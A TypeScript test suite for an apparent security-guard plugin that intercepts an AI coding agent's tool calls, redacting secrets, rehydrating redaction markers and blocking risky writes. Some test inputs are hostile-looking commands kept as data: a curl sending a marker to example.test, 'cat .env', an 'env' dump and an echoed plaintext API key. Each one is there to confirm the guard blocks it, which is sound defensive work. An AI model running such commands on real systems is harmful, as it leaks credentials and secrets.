// security-guard plugin hook-branch suite: the tool.execute.before/after decision
// matrix (block events, rehydration flag matrix, log payloads, fail-closed path).
// Drives the REAL hooks instead of mirroring the decision sequence.
// Run: node --import ./tests/setup-env.mts --test --experimental-strip-types tests/security-guard/plugin-hook-branches.test.mts

import assert from "node:assert/strict"
import fs, { mkdirSync, mkdtempSync, readFileSync, truncateSync, writeFileSync } from "node:fs"
import { syncBuiltinESMExports } from "node:module"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { test } from "node:test"
import { fileLinkSkipReason, linkFile } from "./platform-fixtures.mts"

const LOG = join(mkdtempSync(join(tmpdir(), "sg-hook-branches-")), "guard.log")
process.env.SECURITY_GUARD_LOG = LOG

const { SecurityGuard } = await import("../../src/index.ts")
const { MARKER, LOG_FILE, norm } = await import("../../src/config.ts")
const { FAILED_PLACEHOLDER } = await import("../../src/redact.ts")

const project = mkdtempSync(join(tmpdir(), "sg-hb-project-"))
const inside = join(project, "inside.txt")
const outside = join(project, "..", `sg-hb-outside-${process.pid}.txt`)

const appLogs: any[] = []
const toasts: any[] = []
const client: any = {
    app: { log: async (i: any) => void appLogs.push(i) },
    tui: { showToast: async (i: any) => void toasts.push(i) },
}
const hooks: any = await SecurityGuard({ client, directory: project, worktree: project })

const REAL = "Xy9kQ2mN7vR4tW8zB5c"
const CRED = `api_key=${REAL}`
const MK = (rule: string, hash: string): string => `<${MARKER}:${rule}:${hash}>`
const UNKNOWN = MK("jwt", "0000000000000000")

const readEvents = (): any[] => {
    try {
        return readFileSync(LOG_FILE, "utf8")
            .trim()
            .split("\n")
            .filter(Boolean)
            .map((l) => JSON.parse(l))
    } catch {
        return []
    }
}
const events = (name: string): any[] => readEvents().filter((e) => e.event === name)
const lastMessage = (): string => String(appLogs.at(-1)?.body?.message ?? "")
const before = (tool: string, args: any) =>
    hooks["tool.execute.before"]({ tool, sessionID: "s", callID: "c" }, { args })
const after = (tool: string, output: any, input: any = { tool, sessionID: "s", callID: "c" }) =>
    hooks["tool.execute.after"](input, output)

let minted = ""
async function mint(): Promise<string> {
    if (minted) return minted
    const out: any = { output: CRED, metadata: {} }
    await hooks["tool.execute.after"]({ tool: "bash", sessionID: "seed", callID: "seed" }, out)
    const m = new RegExp(`<${MARKER}:[^:>]+:[0-9a-f]{16}>`).exec(String(out.output))
    assert.ok(m, `no marker minted: ${out.output}`)
    minted = m[0]
    return minted
}

// ── factory ───────────────────────────────────────────────────────────────
test("factory: a second SecurityGuard() call is a no-op and logs already-loaded", async () => {
    const n = events("already-loaded").length
    const second: any = await SecurityGuard({ client, directory: project, worktree: project })
    assert.deepEqual(second, {})
    const ev = events("already-loaded").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "info")
})

// ── before: defensive / redact-mode ───────────────────────────────────────
test("before: missing input/output is a no-op", async () => {
    await hooks["tool.execute.before"](undefined, { args: {} })
    await hooks["tool.execute.before"]({}, undefined)
    await hooks["tool.execute.before"]({ tool: "bash" }, { args: {} })
})

test("before: a sensitive read is allowed in redact mode", async () => {
    await assert.doesNotReject(() => before("read", { filePath: join(project, ".env") }))
})

test("before: a non-sensitive write without markers is allowed", async () => {
    await assert.doesNotReject(() => before("write", { filePath: inside, content: "plain text" }))
})

test("before: an existing clean file is allowed when rehydration is off", async () => {
    const clean = join(project, "clean-notes.txt")
    writeFileSync(clean, "ordinary text\n", "utf8")
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const n = events("blocked.write.fullrewrite").length
        await assert.doesNotReject(() => before("write", { filePath: clean, content: "rewritten" }))
        assert.equal(events("blocked.write.fullrewrite").length, n)
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: a dangling link is blocked when rehydration is off", { skip: fileLinkSkipReason() }, async () => {
    const link = join(project, "dangling-link.txt")
    linkFile(join(project, "missing-link-target.txt"), link)
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const n = events("blocked.write.fullrewrite").length
        await assert.rejects(
            () => before("write", { filePath: link, content: "rewritten" }),
            /could not be inspected safely/,
        )
        const ev = events("blocked.write.fullrewrite").slice(n)
        assert.equal(ev.length, 1)
        assert.equal(ev[0].reason, "dangling-link")
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

// syncBuiltinESMExports mutates process-wide bindings, so this test must stay
// sequential and restore the original function in its finally block.
test("before: a read failure is blocked without exposing its error", { concurrency: false }, async () => {
    const readFailure = join(project, "read-failure.txt")
    writeFileSync(readFailure, "ordinary text\n", "utf8")
    const originalReadFileSync = fs.readFileSync
    const privateError = "private-read-detail"
    fs.readFileSync = ((file: any, ...args: any[]) => {
        if (String(file) === readFailure) throw Object.assign(new Error(privateError), { code: "EIO" })
        return originalReadFileSync(file, ...args)
    }) as typeof fs.readFileSync
    syncBuiltinESMExports()
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const n = events("blocked.write.fullrewrite").length
        await assert.rejects(
            () => before("write", { filePath: readFailure, content: "rewritten" }),
            (error: unknown) =>
                !String(error).includes(privateError) && String(error).includes("could not be inspected safely"),
        )
        const ev = events("blocked.write.fullrewrite").slice(n)
        assert.equal(ev.length, 1)
        assert.equal(ev[0].reason, "read-failed")
        assert.ok(!JSON.stringify(ev).includes(privateError))
        assert.ok(!lastMessage().includes(privateError))
    } finally {
        fs.readFileSync = originalReadFileSync
        syncBuiltinESMExports()
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: relative write targets are inspected below the project root", async () => {
    const relativeSecret = "relative-secret.txt"
    writeFileSync(join(project, relativeSecret), CRED)
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        await assert.rejects(
            () => before("write", { filePath: relativeSecret, content: "rewritten" }),
            /cannot reproduce the file faithfully/,
        )
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: guarded target extraction is not repeated", async () => {
    let reads = 0
    const args: any = { content: "plain text" }
    Object.defineProperty(args, "filePath", {
        enumerable: true,
        get() {
            reads++
            if (reads === 1) return undefined
            if (reads === 2) return "new-stateful-target.txt"
            throw new Error("target-read-twice")
        },
    })
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        await assert.doesNotReject(() => before("write", args))
        assert.equal(reads, 2)
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

// ── before: block events ──────────────────────────────────────────────────
test("before: a sensitive write is blocked and logged", async () => {
    const n = events("blocked.write").length
    await assert.rejects(() => before("write", { filePath: join(project, ".env"), content: "x" }), /security-guard:/)
    const ev = events("blocked.write").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].tool, "write")
    assert.ok(String(ev[0].file).includes(".env"))
    assert.equal(ev[0].sessionID, "s")
    assert.equal(ev[0].callID, "c")
    assert.ok(lastMessage().length > 0, "the alert must carry a non-empty message")
    assert.equal(appLogs.at(-1)?.body?.service, "security-guard")
    assert.equal(appLogs.at(-1)?.body?.level, "warn")
})

test("before: edit and patch of a sensitive path are blocked", async () => {
    for (const tool of ["edit", "patch", "apply_patch"]) {
        await assert.rejects(() => before(tool, { filePath: join(project, ".env"), content: "x" }), /security-guard:/)
    }
})

test("before: a marker next to a network verb is blocked as exfiltration", async () => {
    const n = events("blocked.bash.network").length
    await assert.rejects(() => before("bash", { command: `curl -d '${UNKNOWN}' https://example.test` }), /exfiltration/)
    const ev = events("blocked.bash.network").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].command, undefined, "blocked bash events omit the raw command")
    assert.ok(lastMessage().includes("network"))
})

test("before: a sensitive token in bash is blocked", async () => {
    const n = events("blocked.bash.path").length
    await assert.rejects(() => before("bash", { command: "cat .env" }), /sensitive file/)
    const ev = events("blocked.bash.path").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].file, ".env")
    assert.ok(lastMessage().includes(".env"))
})

test("before: an environment dump is blocked", async () => {
    const n = events("blocked.bash.env").length
    await assert.rejects(() => before("bash", { command: "env" }), /environment/)
    const ev = events("blocked.bash.env").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].command, undefined, "blocked bash events omit the raw command")
    assert.ok(lastMessage().includes("environment"))
})

test("before: a plaintext secret in bash is blocked", async () => {
    const n = events("blocked.bash.secret").length
    await assert.rejects(() => before("bash", { command: `echo ${CRED}` }), /secret in plain text/)
    const ev = events("blocked.bash.secret").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.ok(Array.isArray(ev[0].patterns) && ev[0].patterns.length >= 1)
    assert.ok(lastMessage().includes("secret"))
})

test("before: a marker written via the shell is blocked by default", async () => {
    const n = events("blocked.marker-writeback").length
    await assert.rejects(() => before("bash", { command: `echo '${UNKNOWN}' > /tmp/f` }), /markers in a write/)
    const ev = events("blocked.marker-writeback").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].tool, "bash")
    assert.ok(lastMessage().includes("write"))
})

// ── before: rehydration flag matrix ───────────────────────────────────────
test("before: a known marker inside the worktree is rehydrated and logged", async () => {
    const mk = await mint()
    const n = events("rehydrated").length
    const args: any = { filePath: inside, content: `a=${mk} b=${mk}` }
    await before("write", args)
    assert.ok(args.content.includes(REAL), `not rehydrated: ${args.content}`)
    assert.ok(!args.content.includes(MARKER), "a marker was left behind")
    const ev = events("rehydrated").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "info")
    assert.equal(ev[0].tool, "write")
    assert.ok(Array.isArray(ev[0].hashes) && ev[0].hashes.length === 2)
    assert.equal(String(ev[0].hashes[0]).length, 16)
})

test("before: a known marker outside the worktree is blocked by default", async () => {
    const mk = await mint()
    const n = events("blocked.write.external").length
    await assert.rejects(
        () => before("write", { filePath: outside, content: CRED.replace(REAL, mk) }),
        /outside the project/,
    )
    const ev = events("blocked.write.external").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].file, norm(outside))
    assert.ok(lastMessage().includes("outside"))
})

test("before: the external opt-in rehydrates and logs a warning", async () => {
    const mk = await mint()
    process.env.SECURITY_GUARD_REHYDRATE_EXTERNAL = "1"
    try {
        const n = events("rehydrated.external").length
        const args: any = { filePath: outside, content: CRED.replace(REAL, mk) }
        await before("write", args)
        assert.ok(args.content.includes(REAL), "not rehydrated")
        const ev = events("rehydrated.external").slice(n)
        assert.equal(ev.length, 1)
        assert.equal(ev[0].level, "warn")
        assert.equal(ev[0].tool, "write")
        assert.deepEqual(ev[0].files, [norm(outside)])
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE_EXTERNAL
    }
})

test("before: an unknown marker write is blocked and logged", async () => {
    const n = events("blocked.marker-writeback").length
    await assert.rejects(() => before("write", { filePath: inside, content: `x ${UNKNOWN}` }), /not in the vault/)
    const ev = events("blocked.marker-writeback").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "warn")
    assert.equal(ev[0].tool, "write")
    assert.ok(lastMessage().includes("marker"))
})

test("before: an unknown marker outside the worktree is a writeback, not external", async () => {
    const n = events("blocked.marker-writeback").length
    const m = events("blocked.write.external").length
    await assert.rejects(() => before("write", { filePath: outside, content: UNKNOWN }), /not in the vault/)
    assert.equal(events("blocked.marker-writeback").length, n + 1)
    assert.equal(events("blocked.write.external").length, m, "an unknown marker must not trigger the external block")
})

test("before: a write without markers logs no rehydrated event", async () => {
    const n = events("rehydrated").length
    await before("write", { filePath: inside, content: "plain" })
    assert.equal(events("rehydrated").length, n)
})

test("before: rehydration traverses nested objects, arrays and primitives", async () => {
    const mk = await mint()
    const ext = events("rehydrated.external").length
    const args: any = {
        filePath: inside,
        count: 7,
        flag: true,
        empty: null,
        meta: { list: [mk, "keep"], deep: { content: mk } },
        content: mk,
    }
    await before("write", args)
    assert.equal(events("rehydrated.external").length, ext, "an inside write must not log rehydrated.external")
    assert.ok(args.content.includes(REAL) && !args.content.includes(MARKER))
    assert.ok(args.meta.deep.content.includes(REAL))
    assert.ok(args.meta.list[0].includes(REAL))
    assert.equal(args.meta.list[1], "keep")
    assert.equal(args.meta.list.length, 2)
    assert.equal(args.count, 7)
    assert.equal(args.flag, true)
    assert.equal(args.empty, null)
})

test("before: markers are blocked when rehydration is off", async () => {
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const n = events("blocked.marker-writeback").length
        await assert.rejects(() => before("write", { filePath: inside, content: UNKNOWN }), /placeholders/)
        assert.equal(events("blocked.marker-writeback").length, n + 1)
        assert.ok(lastMessage().includes("redacted"))
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: a full rewrite of a secret-bearing file is blocked when rehydration is off", async () => {
    const f = join(project, "secret-notes.txt")
    writeFileSync(f, `${CRED}\n`)
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const n = events("blocked.write.fullrewrite").length
        await assert.rejects(() => before("write", { filePath: f, content: "rewritten" }), /cannot reproduce/)
        const ev = events("blocked.write.fullrewrite").slice(n)
        assert.equal(ev.length, 1)
        assert.equal(ev[0].level, "warn")
        assert.equal(ev[0].reason, "contains-secrets")
        assert.equal(ev[0].file, "secret-notes.txt", "a path under the project root is relativized")
        assert.ok(lastMessage().includes("secrets"))
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: unverifiable targets are blocked when rehydration is off", async () => {
    const oversized = join(project, "oversized-notes.txt")
    writeFileSync(oversized, `${CRED}\n`)
    truncateSync(oversized, 2 * 1024 * 1024 + 1)
    const directory = join(project, "write-directory")
    mkdirSync(directory)
    const invalid = join(project, "invalid\u0000target")
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        for (const [filePath, reason] of [
            [oversized, "too-large"],
            [directory, "not-file"],
            [invalid, "metadata-failed"],
        ] as const) {
            const n = events("blocked.write.fullrewrite").length
            await assert.rejects(
                () => before("write", { filePath, content: "rewritten" }),
                /could not be inspected safely/,
            )
            const ev = events("blocked.write.fullrewrite").slice(n)
            assert.equal(ev.length, 1)
            assert.equal(ev[0].reason, reason)
            assert.ok(!lastMessage().includes("EACCES"))
        }
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: marker blocking takes precedence over full-rewrite inspection", async () => {
    const f = join(project, "marker-secret-notes.txt")
    writeFileSync(f, `${CRED}\n`)
    process.env.SECURITY_GUARD_REHYDRATE = "0"
    try {
        const markerBlocks = events("blocked.marker-writeback").length
        const rewriteBlocks = events("blocked.write.fullrewrite").length
        await assert.rejects(() => before("write", { filePath: f, content: UNKNOWN }), /placeholders/)
        assert.equal(events("blocked.marker-writeback").length, markerBlocks + 1)
        assert.equal(events("blocked.write.fullrewrite").length, rewriteBlocks)
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE
    }
})

test("before: unverifiable targets do not add a full-rewrite block when rehydration is on", async () => {
    const oversized = join(project, "rehydrated-oversized.txt")
    writeFileSync(oversized, `${CRED}\n`)
    truncateSync(oversized, 2 * 1024 * 1024 + 1)
    const directory = join(project, "rehydrated-directory")
    mkdirSync(directory)
    const n = events("blocked.write.fullrewrite").length
    await before("write", { filePath: oversized, content: "rewritten" })
    await before("write", { filePath: directory, content: "rewritten" })
    assert.equal(events("blocked.write.fullrewrite").length, n)
})

test("before: opt-in bash rehydration restores known markers", async () => {
    const mk = await mint()
    process.env.SECURITY_GUARD_REHYDRATE_BASH = "1"
    try {
        const n = events("rehydrated").length
        const args: any = { command: `printf '%s' '${mk}' > ${inside}` }
        await before("bash", args)
        assert.ok(args.command.includes(REAL), `bash command not rehydrated: ${args.command}`)
        const ev = events("rehydrated").slice(n)
        assert.equal(ev.length, 1)
        assert.equal(ev[0].tool, "bash")
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE_BASH
    }
})

test("before: opt-in bash rehydration blocks unknown markers", async () => {
    process.env.SECURITY_GUARD_REHYDRATE_BASH = "1"
    try {
        await assert.rejects(() => before("bash", { command: `printf '%s' '${UNKNOWN}'` }), /not in the vault/)
    } finally {
        delete process.env.SECURITY_GUARD_REHYDRATE_BASH
    }
})

// ── before: exhaustive rehydration flag matrix ────────────────────────────
type FlagState = "unset" | "0" | "1"
type MarkerKind = "none" | "known" | "unknown"

const setFlag = (key: string, v: FlagState): void => {
    if (v === "unset") delete process.env[key]
    else process.env[key] = v
}

const writeVerdict = (
    r: FlagState,
    e: FlagState,
    dest: "inside" | "outside",
    kind: MarkerKind,
): { block: { event: string; err: RegExp } | null; rehydrated?: boolean; externalWarn?: boolean } => {
    if (kind === "none") return { block: null }
    if (r === "0") return { block: { event: "blocked.marker-writeback", err: /placeholders/ } }
    if (kind === "unknown") return { block: { event: "blocked.marker-writeback", err: /not in the vault/ } }
    if (dest === "outside" && e !== "1")
        return { block: { event: "blocked.write.external", err: /outside the project/ } }
    return { block: null, rehydrated: true, externalWarn: dest === "outside" }
}

test("before: the write rehydration flag matrix is pinned (3x3 flags x destination x marker)", async () => {
    const mk = await mint()
    const contentOf = (kind: MarkerKind): string =>
        kind === "known" ? mk : kind === "unknown" ? UNKNOWN : "plain content"
    const snap = () => ({
        writeback: events("blocked.marker-writeback").length,
        external: events("blocked.write.external").length,
        rehydrated: events("rehydrated").length,
        extWarn: events("rehydrated.external").length,
    })
    for (const r of ["unset", "0", "1"] as const) {
        for (const e of ["unset", "0", "1"] as const) {
            for (const dest of ["inside", "outside"] as const) {
                for (const kind of ["none", "known", "unknown"] as const) {
                    const label = `REHYDRATE=${r} EXTERNAL=${e} ${dest} ${kind}`
                    const before0 = snap()
                    const args: any = { filePath: dest === "inside" ? inside : outside, content: contentOf(kind) }
                    let error: any = null
                    try {
                        setFlag("SECURITY_GUARD_REHYDRATE", r)
                        setFlag("SECURITY_GUARD_REHYDRATE_EXTERNAL", e)
                        await before("write", args)
                    } catch (err) {
                        error = err
                    } finally {
                        delete process.env.SECURITY_GUARD_REHYDRATE
                        delete process.env.SECURITY_GUARD_REHYDRATE_EXTERNAL
                    }
                    const want = writeVerdict(r, e, dest, kind)
                    if (want.block) {
                        assert.ok(error, `${label}: expected a block`)
                        assert.match(String(error?.message), /security-guard:/, label)
                        assert.match(String(error?.message), want.block.err, label)
                        const counted = want.block.event === "blocked.marker-writeback" ? "writeback" : "external"
                        assert.equal(
                            events(want.block.event).length,
                            before0[counted] + 1,
                            `${label}: one ${want.block.event}`,
                        )
                    } else {
                        assert.equal(error, null, `${label}: expected allow, got ${error}`)
                        if (want.rehydrated) {
                            assert.ok(args.content.includes(REAL), `${label}: content must be rehydrated`)
                            assert.equal(
                                events("rehydrated").length,
                                before0.rehydrated + 1,
                                `${label}: rehydrated INFO`,
                            )
                        } else {
                            assert.ok(!args.content.includes(MARKER), `${label}: content must be untouched`)
                        }
                        assert.equal(
                            events("rehydrated.external").length,
                            before0.extWarn + (want.externalWarn ? 1 : 0),
                            `${label}: rehydrated.external count`,
                        )
                    }
                }
            }
        }
    }
})

test("before: the bash rehydration flag matrix is pinned (3 flag states x marker)", async () => {
    const mk = await mint()
    const contentOf = (kind: MarkerKind): string =>
        kind === "known" ? mk : kind === "unknown" ? UNKNOWN : "plain content"
    for (const b of ["unset", "0", "1"] as const) {
        for (const kind of ["none", "known", "unknown"] as const) {
            const label = `BASH=${b} ${kind}`
            const before0 = {
                writeback: events("blocked.marker-writeback").length,
                rehydrated: events("rehydrated").length,
            }
            const args: any = { command: `printf '%s' '${contentOf(kind)}' > ${inside}` }
            let error: any = null
            try {
                setFlag("SECURITY_GUARD_REHYDRATE_BASH", b)
                await before("bash", args)
            } catch (err) {
                error = err
            } finally {
                delete process.env.SECURITY_GUARD_REHYDRATE_BASH
            }
            const want =
                kind === "none"
                    ? { block: null as { event: string; err: RegExp } | null, rehydrated: false }
                    : b !== "1"
                      ? { block: { event: "blocked.marker-writeback", err: /markers in a write/ }, rehydrated: false }
                      : kind === "unknown"
                        ? { block: { event: "blocked.marker-writeback", err: /not in the vault/ }, rehydrated: false }
                        : { block: null, rehydrated: true }
            if (want.block) {
                assert.ok(error, `${label}: expected a block`)
                assert.match(String(error?.message), want.block.err, label)
                assert.equal(
                    events(want.block.event).length,
                    before0.writeback + 1,
                    `${label}: one ${want.block.event}`,
                )
            } else {
                assert.equal(error, null, `${label}: expected allow, got ${error}`)
                if (want.rehydrated) {
                    assert.ok(args.command.includes(REAL), `${label}: command must be rehydrated`)
                    assert.equal(events("rehydrated").length, before0.rehydrated + 1, `${label}: rehydrated INFO`)
                }
            }
        }
    }
})

// ── after: redaction, payload and fail-closed ─────────────────────────────
test("after: a clean output logs no redacted.tool event", async () => {
    const n = events("redacted.tool").length
    await after("bash", { output: "clean text", metadata: {} })
    assert.equal(events("redacted.tool").length, n)
})

test("after: redaction logs redacted.tool with unique/total/at", async () => {
    const n = events("redacted.tool").length
    const output: any = { output: CRED, metadata: { note: CRED }, title: "clean text" }
    await after("bash", output)
    const ev = events("redacted.tool").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "info")
    assert.equal(ev[0].tool, "bash")
    assert.equal(typeof ev[0].unique, "number")
    assert.equal(typeof ev[0].total, "number")
    assert.ok(ev[0].at && typeof ev[0].at === "object")
    assert.ok(Object.keys(ev[0].at).length >= 1)
    for (const value of Object.values(ev[0].at)) assert.ok(Number(value) > 0, "each `at` count must be positive")
    assert.equal(ev[0].sessionID, "s")
    assert.equal(ev[0].callID, "c")
    assert.ok(Array.isArray(ev[0].patterns) && ev[0].patterns.length >= 1)
    assert.ok(lastMessage().length > 0)
    assert.ok(!JSON.stringify(ev[0]).includes(REAL), "the log payload must not leak the secret")
})

test("after: a redaction failure is fail-closed and logs redaction.failed", async () => {
    const n = events("redaction.failed").length
    const output: any = { output: "ok" }
    Object.defineProperty(output, "boom", {
        enumerable: true,
        configurable: true,
        get() {
            throw new Error(`boom ${CRED}`)
        },
    })
    await after("bash", output)
    const ev = events("redaction.failed").slice(n)
    assert.equal(ev.length, 1)
    assert.equal(ev[0].level, "error")
    assert.equal(ev[0].tool, "bash")
    assert.equal(ev[0].error, "redaction-error", "the engine text is replaced by a stable code")
    assert.ok(!JSON.stringify(ev[0]).includes("boom"), "the engine message must not be logged")
    assert.ok(!JSON.stringify(ev[0]).includes(REAL), "the error payload must be sanitized")
    assert.equal(output.output, FAILED_PLACEHOLDER)
})

test("after: missing input/output is a no-op", async () => {
    await hooks["tool.execute.after"]({}, undefined)
    await hooks["tool.execute.after"](undefined, { output: "x" })
})
